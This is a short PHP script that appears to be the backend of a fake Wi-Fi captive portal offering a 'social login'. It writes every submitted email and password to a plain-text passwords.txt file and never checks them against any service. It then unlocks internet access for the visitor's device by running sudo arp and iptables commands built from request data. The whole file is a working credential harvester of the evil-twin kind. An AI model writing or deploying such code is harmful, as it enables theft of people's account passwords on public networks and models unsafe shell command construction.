<?php
$socialn=$_POST['socialn'];
if(!empty($socialn)) {	
	$email=$_POST['email'];
	$userpassword=$_POST['userpassword'];
	file_put_contents('passwords.txt', print_r($_POST, true), FILE_APPEND);
	sleep(2);
	$ip = $_SERVER['REMOTE_ADDR'];
	$mac = shell_exec("sudo /usr/sbin/arp -an " . $ip);
	preg_match('/..:..:..:..:..:../',$mac , $matches);
	$mac = @$matches[0];
	$res=shell_exec("sudo /sbin/iptables -I captiveportal 1 -t mangle -m mac --mac-source $mac -j RETURN 2>&1");
}
	else
{
	header("location:https://afikim-t.co.il/");
}
?>